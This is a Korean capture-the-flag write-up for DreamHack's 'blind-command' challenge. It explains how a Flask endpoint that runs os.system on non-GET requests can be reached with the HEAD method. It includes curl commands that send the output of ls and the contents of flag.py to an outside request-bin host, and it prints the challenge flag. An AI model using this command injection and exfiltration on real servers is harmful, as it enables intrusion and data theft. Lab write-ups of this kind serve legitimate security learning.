# [DreamHack] blind-command

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> Read the flag file XD
>
> Release: [blind-command.zip](https://github.com/h0meb0dy/Dreamhack-Wargame/files/8561977/blind-command.zip)

## Analysis

```python
@app.route('/' , methods=['GET'])
def index():
    cmd = request.args.get('cmd', '')
    if not cmd:
        return "?cmd=[cmd]"

    if request.method == 'GET':
        ''
    else:
        os.system(cmd)
    return cmd
```

`cmd` 변수에 값을 전달하면, 요청의 메소드가 `GET`인 경우 아무 동작도 하지 않고, `GET`이 아닌 경우 `os.system(cmd)`를 실행한다. 그리고 페이지에는 `cmd`를 그대로 반환한다.

## Exploit

### Remote code execution

서버에 `OPTIONS` 메소드로 요청을 보내면 어떤 메소드들이 허용되는지 헤더에 담아서 응답을 보내준다.

![image](https://user-images.githubusercontent.com/104156058/165386899-52c01572-665f-46be-8d3e-256706aa2ac6.png)

Burp suite에서 패킷의 메소드를 `OPTIONS`로 수정하고 forward시키면

![image](https://user-images.githubusercontent.com/104156058/165387016-b378baaf-b338-4f7e-89fd-27609fb5c915.png)

`app.py` 코드 상으로는 `GET` 메소드만 허용되지만 실제로는 `HEAD`, `OPTIONS`, `GET` 메소드가 허용되는 것을 알 수 있다. `HEAD` 메소드는 `GET`과 유사하지만 헤더 정보만 보낸다는 차이점이 있는데, 어쨌든 `cmd` 변수의 값은 서버로 잘 넘어갈 것이므로 `os.system(cmd)`가 실행되도록 할 수 있다.

```
$ python3 app.py
 * Serving Flask app 'app' (lazy loading)
 * Environment: production
   WARNING: This is a development server. Do not use it in a production deployment.
   Use a production WSGI server instead.
 * Debug mode: off
 * Running on all addresses (0.0.0.0)
   WARNING: This is a development server. Do not use it in a production deployment.
 * Running on http://127.0.0.1:8000
```

로컬에 테스트 서버를 열고

![image](https://user-images.githubusercontent.com/104156058/165387859-39af1d38-99c8-4c7f-912a-1bf9702afe35.png)

`HEAD` 메소드로 `?cmd=echo AAAA`를 보내면

```
AAAA
127.0.0.1 - - [27/Apr/2022 05:36:20] "HEAD /?cmd=echo%20AAAA HTTP/1.1" 200 -
```

서버에서 커맨드가 정상적으로 실행되는 것을 확인할 수 있다.

### Get flag

서버에 있는 플래그 파일의 내용을 `curl`로 내 서버로 전송하면 된다. 전송받을 서버로는 DreamHack tools의 request bin을 이용하면 편하다. `curl <url> -d param=value` 커맨드를 실행하면 `<url>`에 `POST` 메소드로 `param=value`라는 데이터를 전송할 수 있다. 이때 `value`에 공백이나 개행 등이 있으면 그 위치까지만 전송된다.

먼저 플래그 파일의 이름을 확인하기 위해 `ls`의 실행 결과를 전송한다. 커맨드는 다음과 같다.

```bash
curl https://dbkqkeu.request.dreamhack.games -d data=$(ls | tr -d ' |\n')
```

`tr`에 `-d` 옵션을 주면 문자열에서 특정 문자를 찾아서 제거할 수 있다. 따라서 `ls`의 실행 결과에서 공백과 개행을 제거해서 서버로 전송하는 커맨드가 된다.

![image](https://user-images.githubusercontent.com/104156058/165395509-97c0e24b-1d36-41ff-99c8-3004be9beef3.png)

![image](https://user-images.githubusercontent.com/104156058/165395555-89ac9cff-b631-4cf9-bbd8-c3cffd6c55b7.png)

전송된 데이터로부터 `flag.py` 파일이 있는 것을 확인할 수 있다. 다시 같은 방식으로 `flag.py` 파일의 내용을 서버로 전송하면 플래그를 획득할 수 있다. 커맨드는 다음과 같다.

```bash
curl https://dbkqkeu.request.dreamhack.games -d data=$(cat flag.py | tr -d ' |\n')
```

![image](https://user-images.githubusercontent.com/104156058/165395711-dd1d993f-f732-413b-b7a2-95a398c89664.png)

![image](https://user-images.githubusercontent.com/104156058/165395749-fa796eb1-3d51-4d2c-ab2a-b49f2d604562.png)

```
flag: DH{4c9905b5abb9c3eb10af4ab7e1645c23}
```